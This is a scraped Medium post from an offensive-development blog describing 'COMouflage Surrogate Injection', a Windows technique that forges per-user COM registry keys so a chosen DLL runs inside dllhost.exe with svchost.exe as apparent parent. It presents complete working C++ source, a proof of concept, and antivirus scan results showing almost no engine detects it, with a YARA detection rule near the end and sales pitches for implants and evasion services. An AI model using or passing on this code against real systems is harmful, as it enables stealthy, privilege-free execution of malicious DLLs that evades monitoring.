@@ -1,0 +1,541 @@
+# https://medium.com/@s12deff/comouflage-surrogate-injection-cfb93e15afcd
+
+[Sitemap](https://medium.com/sitemap/sitemap.xml)
+
+[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)
+
+Sign up
+
+[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Fcomouflage-surrogate-injection-cfb93e15afcd&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)
+
+[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)
+
+Get app
+
+[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)
+
+[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)
+
+Sign up
+
+[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Fcomouflage-surrogate-injection-cfb93e15afcd&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)
+
+![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)
+
+# **COMouflage: Surrogate Injection**
+
+[![S12 - 0x12Dark Development](https://miro.medium.com/v2/resize:fill:32:32/1*NlusgtOWLGgb5Bukla3xFw.jpeg)](https://medium.com/@s12deff?source=post_page---byline--cfb93e15afcd---------------------------------------)
+
+[S12 - 0x12Dark Development](https://medium.com/@s12deff?source=post_page---byline--cfb93e15afcd---------------------------------------)
+
+Follow
+
+10 min read
+
+·
+
+Apr 6, 2026
+
+4
+
+[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3Dcfb93e15afcd&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Fcomouflage-surrogate-injection-cfb93e15afcd&source=---header_actions--cfb93e15afcd---------------------post_audio_button------------------)
+
+Share
+
+Welcome to this new Medium post, in this one we have a great technique used to inject a DLL into the **svchost.exe** process, masquerading the parent process id. The technique is named **COMouflage Surrogate Injection**
+
+What if you could inject malicious code into a trusted Windows process without ever touching it directly, without admin rights, and without triggering most EDR solutions?
+
+That’s exactly what **COMouflage** achieves. By weaponizing a legitimate Windows mechanism called _DLL Surrogate_, an attacker can make malware run inside **dllhost.exe**, with **svchost.exe** appearing as its parent.
+
+To any analyst glancing at the process tree, nothing looks out of the ordinary. This post breaks down exactly how this technique works, why it’s so stealthy, and how it’s implemented in C++
+
+**Author of this post:**
+
+[**zero2504 - Overview** \\
+\\
+**Security researcher focused on Windows Internals & Malware Development / Happily married - zero2504**\\
+\\
+github.com](https://github.com/zero2504?source=post_page-----cfb93e15afcd---------------------------------------)
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*SNmVhFTeP2sPEzKy4pmJGg.png)
+
+**Courses:** Learn how offensive development works on Windows OS from beginner to advanced taking our courses, all explained in C++.
+
+[**All Courses** \\
+\\
+**Learn how real Windows offensive development works**\\
+\\
+0x12darkdev.net](https://0x12darkdev.net/courses/?origin=medium&source=post_page-----cfb93e15afcd---------------------------------------)
+
+**Technique Database:** Access 70+ real offensive techniques with weekly updates, complete with code, PoCs, and AV scan results:
+
+[**Malware Techniques Database** \\
+\\
+**Explore an ever-growing collection of techniques**\\
+\\
+0x12darkdev.net](https://0x12darkdev.net/techniques/?source=post_page-----cfb93e15afcd---------------------------------------)
+
+**Modules**: Dive deep into essential offensive topics with our modular **text-training** program! Get a new module every 14 days. Start at just **$1.99 per module**, or unlock **lifetime access to all modules for $100**.
+
+[**0x12 Dark Development** \\
+\\
+**Learn the best offensive techniques for Windows OS, with content ranging from beginner to advanced levels. All…**\\
+\\
+0x12darkdev.net](https://0x12darkdev.net/modules?source=post_page-----cfb93e15afcd---------------------------------------)
+
+## Methodology
+
+COM (Component Object Model) hijacking has long been documented as a persistence trick swap out a registry key, get your DLL loaded. But COMouflage takes things further. Rather than just persisting, it uses COM’s **DLL Surrogate** mechanism to achieve full **process injection with parent process masquerading**
+
+When Windows launches a COM object configured as an out-of-process server, it spins up **dllhost.exe** automatically and the parent of that **dllhost.exe** is **svchost.exe**, not your malicious process. The initiating process disappears from the lineage entirely.
+
+Before touching any code, let’s walk through the logical recipe.
+
+To achieve surrogate-based DLL injection, we follow these steps:
+
+### **Forge the Registry Identity**
+
+First, we need to create a fake COM object identity in the Windows registry specifically inside **HKEY\_CURRENT\_USER** (HKCU), not **HKEY\_LOCAL\_MACHINE**.
+
+This is critical because **HKCU** requires **no elevated privileges**. We write two registry paths: one for the **AppID** (which tells Windows _how_ to host the object) and one for the **CLSID** (which tells Windows _what_ the object is and where the DLL lives)
+
+### **Set the DllSurrogate Trigger**
+
+Inside the **AppID** key, we set a value called **DllSurrogate** to an **empty string**. This is the magic switch. An empty DllSurrogate value tells Windows: **_Use the default surrogate host_** which is **dllhost.exe**. Windows will automatically launch it and load our DLL inside it.
+
+### **Set the DllSurrogate Trigger**
+
+Under the **CLSID** key’s **InprocServer32** subkey, we write the full path to our malicious DLL. The **ThreadingModel** is set to **Apartment** to satisfy COM’s threading requirements and prevent instantiation failures
+
+### **Point to the Payload DLL**
+
+Under the **CLSID** key’s **InprocServer32** subkey, we write the full path to our malicious DLL. The **ThreadingModel** is set to **Apartment** to satisfy COM’s threading requirements and prevent instantiation failures
+
+### **Trigger Instantiation via CoCreateInstance**
+
+Finally, we call **CoCreateInstance** with the flag **CLSCTX\_LOCAL\_SERVER**. This flag is the detonator. It forces Windows to treat our COM object as an _out-of-process_ server, which causes the COM Service Control Manager to read our registry entries, find the **DllSurrogate** value, launch **dllhost.exe**, and load our DLL into it. Our job is done.
+
+## Implementation
+
+Now, let’s look at how to translate that logic into C++ code. I have broken down the most important parts.
+
+### **Registry Helper Function**
+
+```
+bool SetRegStr(HKEY root, const std::wstring& key,
+               const std::wstring& name, const std::wstring& val) {
+    HKEY h;
+    if (RegCreateKeyExW(root, key.c_str(), 0, nullptr,
+        REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr, &h, nullptr) != ERROR_SUCCESS)
+        return false;
+
+    if (RegSetValueExW(h,
+        name.empty() ? nullptr : name.c_str(),
+        0, REG_SZ,
+        (const BYTE*)val.c_str(),
+        DWORD((val.size() + 1) * sizeof(wchar_t))) != ERROR_SUCCESS)
+    {
+        RegCloseKey(h);
+        return false;
+    }
+    RegCloseKey(h);
+    return true;
+}
+```
+
+This is the utility function that does all the registry writing. **RegCreateKeyExW** either creates a new key or opens an existing one, it’s non-destructive if the key already exists.
+
+Notice **REG\_OPTION\_NON\_VOLATILE**: this makes the key persist across reboots. For a stealthier, memory-only variant, you could swap this for **REG\_OPTION\_VOLATILE**, which evaporates when the hive is unloaded.
+
+### **Writing the AppID and CLSID Keys**
+
+```
+static const wchar_t* CLSID_STR = L"{F00DBABA-2504-2025-2016-666699996666}";
+
+// AppID key: tells Windows to use dllhost.exe as surrogate
+std::wstring appidKey = LR"(Software\Classes\AppID\)" + std::wstring(CLSID_STR);
+SetRegStr(HKEY_CURRENT_USER, appidKey, L"",             L"MyStealthObject");
+SetRegStr(HKEY_CURRENT_USER, appidKey, L"DllSurrogate", L"");  // Empty = use dllhost.exe
+
+// CLSID key: defines the COM object and points to the DLL
+std::wstring clsidKey  = LR"(Software\Classes\CLSID\)" + std::wstring(CLSID_STR);
+std::wstring inprocKey = clsidKey + LR"(\InprocServer32)";
+
+SetRegStr(HKEY_CURRENT_USER, clsidKey,  L"",              L"MyStealthObject");
+SetRegStr(HKEY_CURRENT_USER, clsidKey,  L"AppID",         CLSID_STR);
+SetRegStr(HKEY_CURRENT_USER, inprocKey, L"",              L"C:\\Users\\sample.dll");
+SetRegStr(HKEY_CURRENT_USER, inprocKey, L"ThreadingModel", L"Apartment");
+```
+
+This is where the COM identity is constructed. The **CLSID** is essentially a fake name tag for our object, a GUID we invented.
+
+## Get S12 - 0x12Dark Development’s stories in your inbox
+
+Join Medium for free to get updates from this writer.
+
+Subscribe
+
+Subscribe
+
+Remember me for faster sign in
+
+The **AppID** entry with **DllSurrogate = “”** is the key instruction to Windows. The **InprocServer32** entry is what tells **dllhost.exe** ( _which DLL)_ to load once it spawns. The path should point to a user-writable location to stay privilege-free
+
+### **The Trigger CoCreateInstance**
+
+```
+HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
+
+CLSID clsid;
+CLSIDFromString(const_cast<LPWSTR>(CLSID_STR), &clsid);
+
+IUnknown* p;
+hr = CoCreateInstance(
+    clsid,
+    nullptr,
+    CLSCTX_LOCAL_SERVER,  // <-- This is the detonator
+    IID_IUnknown,
+    (void**)&p
+);
+```
+
+**CoInitializeEx** sets up the COM runtime for the current thread. Then **CLSIDFromString** converts our GUID string into the binary format COM needs internally
+
+The crucial line is **CoCreateInstance** with **CLSCTX\_LOCAL\_SERVER**. Without this flag, COM would try to load the DLL in-process (directly into our own process) which is not what we want.
+
+**CLSCTX\_LOCAL\_SERVER** forces COM to go _out-of-process_, which means the COM SCM kicks in, reads the registry, finds **DllSurrogate**, and spawns **dllhost.exe** to host the DLL. Our process triggered the injection but never directly touched dllhost.exe
+
+### **The Resulting Process Tree**
+
+```
+svchost.exe  (COM+ System Application)
+└── dllhost.exe /Processid:{F00DBABA-...}
+└── [sample.dll loaded and executing]
+```
+
+The attacker’s process is **nowhere in this tree**. From a process monitoring perspective, this looks like routine COM activity
+
+## Code
+
+Complete code:
+
+```
+#include <windows.h>
+#include <objbase.h>
+#include <iostream>
+
+// Custom CLSID for our malicious COM object
+// This GUID will uniquely identify our COM object in the registry
+static const wchar_t* CLSID_STR = L"{F00DBABA-2504-2025-2016-666699996666}";
+
+//Helper function to write string values to Windows registry
+bool SetRegStr(HKEY root, const std::wstring& key, const std::wstring& name, const std::wstring& val) {
+    HKEY h;
+
+    // Create or open the registry key with write permissions
+    // REG_OPTION_VOLATILE means the key won't persist across reboots
+    if (RegCreateKeyExW(root, key.c_str(), 0, nullptr,
+        REG_OPTION_VOLATILE, KEY_WRITE, nullptr, &h, nullptr) != ERROR_SUCCESS) {
+        return false;
+    }
+
+    // Write the string value to the registry
+    if (RegSetValueExW(h,
+        name.empty() ? nullptr : name.c_str(),
+        0, REG_SZ,
+        reinterpret_cast<const BYTE*>(val.c_str()),
+        DWORD((val.size() + 1) * sizeof(wchar_t))) != ERROR_SUCCESS) {
+        RegCloseKey(h);
+        return false;
+    }
+
+    RegCloseKey(h);
+    return true;
+}
+
+int wmain() {
+    // STEP 1: Create AppID registry entry for DLL Surrogate configuration
+    // This tells Windows to use dllhost.exe as a surrogate process
+    std::wstring appidKey = LR"(Software\Classes\AppID\)" + std::wstring(CLSID_STR);
+
+    // Set default value and empty DllSurrogate (triggers default dllhost.exe)
+    if (!SetRegStr(HKEY_CURRENT_USER, appidKey, L"", L"MyStealthObject") ||
+        !SetRegStr(HKEY_CURRENT_USER, appidKey, L"DllSurrogate", L"")) {
+        std::wcerr << L"[!] AppID registry failed\n";
+        return 1;
+    }
+
+    // STEP 2: Create CLSID registry entries to define our COM object
+    // This maps our CLSID to the malicious DLL and links it to the AppID
+    std::wstring clsidKey = LR"(Software\Classes\CLSID\)" + std::wstring(CLSID_STR);
+    std::wstring inprocKey = clsidKey + LR"(\InprocServer32)";
+
+    if (!SetRegStr(HKEY_CURRENT_USER, clsidKey, L"", L"MyStealthObject") ||           // Object name
+        !SetRegStr(HKEY_CURRENT_USER, clsidKey, L"AppID", CLSID_STR) ||              // Link to AppID
+        !SetRegStr(HKEY_CURRENT_USER, inprocKey, L"", L"C:\\Users\\Public\\DummyDLL.dll") ||   // Path to malicious DLL
+        !SetRegStr(HKEY_CURRENT_USER, inprocKey, L"ThreadingModel", L"Apartment")) { // COM threading model
+        std::wcerr << L"[!] CLSID registry failed\n";
+        return 1;
+    }
+
+    std::wcout << L"[+] Registry for COM surrogates created\n";
+
+    // STEP 3: Initialize COM subsystem and trigger the injection
+    // Initialize COM library for apartment-threaded model
+    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
+    if (FAILED(hr)) {
+        std::wcerr << L"[!] CoInitializeEx: 0x" << std::hex << hr << L"\n";
+        return 1;
+    }
+
+    // Convert string CLSID to binary format
+    CLSID clsid;
+    hr = CLSIDFromString(const_cast<LPWSTR>(CLSID_STR), &clsid);
+    if (FAILED(hr)) {
+        std::wcerr << L"[!] Invalid CLSID\n";
+        return 1;
+    }
+
+    // THE MAGIC HAPPENS HERE!
+    // CLSCTX_LOCAL_SERVER forces Windows to:
+    // 1. Look up our CLSID in the registry
+    // 2. Find the DllSurrogate entry
+    // 3. Launch dllhost.exe as a surrogate process
+    // 4. Load our malicious DLL into dllhost.exe
+    // 5. The parent process appears as svchost.exe
+    IUnknown* p;
+    hr = CoCreateInstance(clsid, nullptr,
+        CLSCTX_LOCAL_SERVER,  // KEY PARAMETER: Forces out-of-process execution
+        IID_IUnknown,
+        (void**)&p);
+
+    // Clean up COM subsystem
+    CoUninitialize();
+
+    // At this point, our DLL is running in dllhost.exe with svchost.exe as parent
+    return 0;
+}
+```
+
+## Proof of Concept
+
+**Windows 11:**
+
+If we try to run the code:
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*bjK_0ANKCtIxpXTUYGN3Ww.png)
+
+The messagebox is the message loaded from the DLL
+
+## Detection
+
+Now it’s time to see if the defenses are detecting this as a malicious threat
+
+### Kleenscan API
+
+```
+[*] Antivirus Scan Results:
+
+  - alyac                | Status: scanning   | Flag: Scanning results incomplete    | Updated: 2026-04-05
+  - amiti                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - arcabit              | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - avast                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - avg                  | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - avira                | Status: scanning   | Flag: Scanning results incomplete    | Updated: 2026-04-05
+  - bullguard            | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - clamav               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - comodolinux          | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - crowdstrike          | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - drweb                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - emsisoft             | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - escan                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - fprot                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - fsecure              | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - gdata                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - ikarus               | Status: ok         | Flag: Trojan-Downloader.Win64.Agent  | Updated: 2026-04-05
+  - immunet              | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - kaspersky            | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - maxsecure            | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - mcafee               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - microsoftdefender    | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - nano                 | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - nod32                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - norman               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - secureageapex        | Status: ok         | Flag: Unknown                        | Updated: 2026-04-05
+  - seqrite              | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - sophos               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - threatdown           | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - trendmicro           | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - vba32                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - virusfighter         | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - xvirus               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - zillya               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - zonealarm            | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+  - zoner                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
+```
+
+### Litterbox
+
+Static Analysis:
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*_RZVT-z2IzvlpF1VmCmlGg.png)
+
+### ThreatCheck
+
+```
+[+] No threats found!
+```
+
+### Windows Defender
+
+Not detected
+
+### Kaspersky Free AV
+
+Not detected
+
+### Bitdefender Free AV
+
+Not detected
+
+### YARA
+
+Here a YARA rule to detect this technique:
+
+```
+rule Win_T1546_015_COMouflage_Surrogate_Injection {
+    meta:
+        author = "0x12 Dark Development"
+        description = "Detects COM Surrogate injection technique (COMouflage) which weaponizes DLL Surrogates for process injection and parent PID masquerading."
+        technique = "T1546.015 (Component Object Model Hijacking)"
+        context = "https://0x12darkdev.net"
+        date = "2026-04-06"
+        severity = "High"
+
+    strings:
+        // Registry paths and keys critical to the technique
+        $reg_appid = "Software\\Classes\\AppID\\" wide ascii
+        $reg_clsid = "Software\\Classes\\CLSID\\" wide ascii
+        $reg_inproc = "\\InprocServer32" wide ascii
+        $val_surrogate = "DllSurrogate" wide ascii
+        $val_threading = "ThreadingModel" wide ascii
+
+        // API imports typically used to implement this
+        $api_reg_create = "RegCreateKeyEx"
+        $api_reg_set = "RegSetValueEx"
+        $api_cocreate = "CoCreateInstance"
+        $api_clside_str = "CLSIDFromString"
+
+        // Hex for CLSCTX_LOCAL_SERVER (0x4) often passed to CoCreateInstance
+        // This is a more behavioral indicator if found in code logic
+        $hex_local_server = { 04 00 00 00 }
+
+    condition:
+        uint16(0) == 0x5A4D and // PE File
+        (
+            // Check for the combination of registry manipulation and COM instantiation
+            (all of ($reg_*)) and
+            (all of ($val_*)) and
+            (any of ($api_*)) and
+            $hex_local_server
+        ) or (
+            // High confidence if it includes the specific logic for empty DllSurrogate strings
+            $val_surrogate and $reg_appid and $api_reg_set
+        )
+}
+```
+
+Here you have my collection of YARA rules:
+
+[**GitHub — S12cybersecurity/YaraRules: Collection of interesting Yara Rules** \\
+\\
+**Collection of interesting Yara Rules. Contribute to S12cybersecurity/YaraRules development by creating an account on…**\\
+\\
+github.com](https://github.com/S12cybersecurity/YaraRules?source=post_page-----cfb93e15afcd---------------------------------------)
+
+## Conclusions
+
+In conclusion, **COMouflage Surrogate Injection** represents a sophisticated evolution of traditional COM hijacking by weaponizing the built-in `DllSurrogate` mechanism to achieve stealthy process injection without requiring administrative privileges. By decoupling the malicious process from its lineage and masquerading under the trusted `svchost.exe` and `dllhost.exe` tree, this technique effectively bypasses standard behavioral heuristics and parent-child relationship monitoring used by many EDR solutions.
+
+**📌 Follow me:** [YouTube](https://www.youtube.com/@0x12darkdev) \| 🐦 [X](https://x.com/Salsa12__) \| 💬 [Discord Server](https://discord.gg/K2HqYuj5Tv) \| 📸 [Instagram](https://www.instagram.com/malwaredevs12) \| [Newsletter](https://0x12darkdevelopmentnewsletter.eo.page/q41nr)
+
+We help security teams enhance offensive capabilities with precision-built tooling and expert guidance, from custom implants to advanced evasion strategies
+
+[**Offensive Development Consultant** \\
+\\
+**We developed specialized offensive implants for security professionals**\\
+\\
+0x12darkdev.net](https://0x12darkdev.net/offensive-development-services/?source=post_page-----cfb93e15afcd---------------------------------------)
+
+**S12.**
+
+[Malware](https://medium.com/tag/malware?source=post_page-----cfb93e15afcd---------------------------------------)
+
+[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----cfb93e15afcd---------------------------------------)
+
+[Hacking](https://medium.com/tag/hacking?source=post_page-----cfb93e15afcd---------------------------------------)
+
+[Pentesting](https://medium.com/tag/pentesting?source=post_page-----cfb93e15afcd---------------------------------------)
+
+[Infosec](https://medium.com/tag/infosec?source=post_page-----cfb93e15afcd---------------------------------------)
+
+[![S12 - 0x12Dark Development](https://miro.medium.com/v2/resize:fill:48:48/1*NlusgtOWLGgb5Bukla3xFw.jpeg)](https://medium.com/@s12deff?source=post_page---post_author_info--cfb93e15afcd---------------------------------------)
+
+[![S12 - 0x12Dark Development](https://miro.medium.com/v2/resize:fill:64:64/1*NlusgtOWLGgb5Bukla3xFw.jpeg)](https://medium.com/@s12deff?source=post_page---post_author_info--cfb93e15afcd---------------------------------------)
+
+Follow
+
+[**Written by S12 - 0x12Dark Development**](https://medium.com/@s12deff?source=post_page---post_author_info--cfb93e15afcd---------------------------------------)
+
+[4.1K followers](https://medium.com/@s12deff/followers?source=post_page---post_author_info--cfb93e15afcd---------------------------------------)
+
+· [51 following](https://medium.com/@s12deff/following?source=post_page---post_author_info--cfb93e15afcd---------------------------------------)
+
+Red Team Enthusiast [https://0x12darkdev.net/](https://0x12darkdev.net/)
+
+Follow
+
+## No responses yet
+
+![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)
+
+Write a response
+
+[What are your thoughts?](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Fcomouflage-surrogate-injection-cfb93e15afcd&source=---post_responses--cfb93e15afcd---------------------respond_sidebar------------------)
+
+Cancel
+
+Respond
+
+[Help](https://help.medium.com/hc/en-us?source=post_page-----cfb93e15afcd---------------------------------------)
+
+[Status](https://status.medium.com/?source=post_page-----cfb93e15afcd---------------------------------------)
+
+[About](https://medium.com/about?autoplay=1&source=post_page-----cfb93e15afcd---------------------------------------)
+
+[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----cfb93e15afcd---------------------------------------)
+
+[Press](mailto:pressinquiries@medium.com)
+
+[Blog](https://blog.medium.com/?source=post_page-----cfb93e15afcd---------------------------------------)
+
+[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----cfb93e15afcd---------------------------------------)
+
+[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----cfb93e15afcd---------------------------------------)
+
+[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----cfb93e15afcd---------------------------------------)
+
+[Text to speech](https://speechify.com/medium?source=post_page-----cfb93e15afcd---------------------------------------)
+
+reCAPTCHA
+
+Recaptcha requires verification.
+
+protected by **reCAPTCHA**
